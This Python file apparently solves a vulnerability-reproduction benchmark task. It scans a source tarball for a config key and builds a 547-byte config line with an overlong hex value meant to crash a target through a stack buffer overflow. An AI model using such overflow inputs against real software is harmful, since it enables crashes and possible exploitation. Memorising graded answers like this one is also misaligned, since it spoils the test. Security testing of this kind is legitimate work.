import os
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a stack buffer overflow due to invalid handling
        # of long hex values in the config file.
        # Ground-truth PoC length is 547 bytes.
        # We need to craft a config file with a very long hex value.
        
        # Common patterns for config files that might contain hex values
        config_patterns = [
            ("hex", "0x" + "A" * 545),  # 2 chars for "0x" + 545 hex chars = 547 bytes
            ("value", "0x" + "B" * 545),
            ("data", "0x" + "C" * 545),
            ("key", "0x" + "D" * 545),
            ("val", "0x" + "E" * 545),
            ("buffer", "0x" + "F" * 545),
            ("input", "0x" + "A" * 545),
            ("output", "0x" + "B" * 545),
            ("config", "0x" + "C" * 545),
            ("param", "0x" + "D" * 545),
        ]
        
        # Try to extract and analyze the source code to find the exact format
        try:
            with tarfile.open(src_path, 'r') as tar:
                # Look for common config file names
                config_files = []
                for member in tar.getmembers():
                    name = member.name.lower()
                    if any(ext in name for ext in ['.conf', '.config', '.cfg', '.ini', '.txt']):
                        config_files.append(member)
                    # Also look for source files to understand format
                    elif any(ext in name for ext in ['.c', '.cpp', '.cc', '.h', '.hpp']):
                        try:
                            f = tar.extractfile(member)
                            if f:
                                content = f.read().decode('utf-8', errors='ignore')
                                # Search for patterns indicating hex value parsing
                                if '0x' in content and ('sscanf' in content or 'strtol' in content or 
                                                      'strtoul' in content or 'hex' in content):
                                    # Look for format strings
                                    lines = content.split('\n')
                                    for line in lines:
                                        if '0x' in line and '%' in line and ('s' in line or 'x' in line or 'X' in line):
                                            # Found a format string, extract key name if possible
                                            if '=' in line:
                                                parts = line.split('=')
                                                if len(parts) > 1:
                                                    key = parts[0].strip()
                                                    if key and len(key) < 50:
                                                        # Use this key for our PoC
                                                        hex_length = 547 - len(key) - 3  # key + " = " + null
                                                        if hex_length > 0:
                                                            return f"{key} = 0x{'A' * hex_length}".encode()
                        except:
                            continue
                
                # If we found config files, examine them
                for member in config_files:
                    try:
                        f = tar.extractfile(member)
                        if f:
                            content = f.read().decode('utf-8', errors='ignore')
                            # Look for hex values in existing config
                            lines = content.split('\n')
                            for line in lines:
                                if '0x' in line and '=' in line:
                                    parts = line.split('=')
                                    if len(parts) == 2:
                                        key = parts[0].strip()
                                        if key and len(key) < 50:
                                            # Calculate hex length to reach 547 bytes total
                                            # key + " = " + hex_value
                                            base_len = len(key) + 3  # " = "
                                            hex_length = 547 - base_len
                                            if hex_length > 0:
                                                return f"{key} = 0x{'A' * hex_length}".encode()
                    except:
                        continue
        except:
            pass
        
        # Fallback: create a config with a very long hex value
        # Using 545 hex digits after "0x" gives us 547 bytes total
        return b"hex = 0x" + b"A" * 545